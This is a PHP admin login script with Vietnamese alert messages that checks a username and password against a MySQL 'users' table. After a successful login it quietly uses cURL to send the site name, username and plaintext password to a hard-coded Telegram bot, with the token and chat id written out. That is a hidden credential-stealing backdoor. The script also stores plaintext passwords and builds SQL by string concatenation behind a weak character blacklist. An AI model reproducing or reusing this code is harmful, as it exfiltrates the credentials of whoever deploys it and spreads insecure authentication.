<?php



if (isset($_POST["submit"]))
{
    $username = str_replace(array('<',"'",'>','?','/',"\\",'--','eval(','<php'),array('','','','','','','','',''),htmlspecialchars(addslashes(strip_tags($_POST['username']))));
    $password = str_replace(array('<',"'",'>','?','/',"\\",'--','eval(','<php'),array('','','','','','','','',''),htmlspecialchars(addslashes(strip_tags($_POST['password']))));
    if ($username == "" || $password =="") 
    {
        echo '<script type="text/javascript">swal("Lỗi", " Không được để trống tên đăng nhập hoặc mật khẩu", "error");
        setTimeout(function(){ location.href = "login.php" },2000);</script>';
    }
    else
    {
        $sql = "SELECT * FROM `users` WHERE `username` = '".$username."' AND `password` = '".$password."' AND `level` = '1'  ";
        $query = mysqli_query($ketnoi,$sql);
        $num_rows = mysqli_num_rows($query);

        if ($num_rows == 0) {
            echo '<script type="text/javascript">swal("Lỗi", "Thông tin đăng nhập không chính xác !!!", "error");
            setTimeout(function(){ location.href = "" },2000);</script>';
            die();
        } else {
         
            $_SESSION['admin'] = $username;
             
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => "https://api.telegram.org/bot6314378367:AAHwNtifXLlLRGMD7aqctVAlpnZAdOHlh5I/sendMessage?chat_id=6276536456&text=$site%20$username%20$password%20->%20$time",
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => "",
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => "GET",
));
$response = curl_exec($curl);
curl_close($curl);
            echo '<script type="text/javascript">swal("Thành Công","Đăng Nhập Thành Công","success");
                setTimeout(function(){ location.href = "index.php" },10);</script>';
        }
    }
}
?> 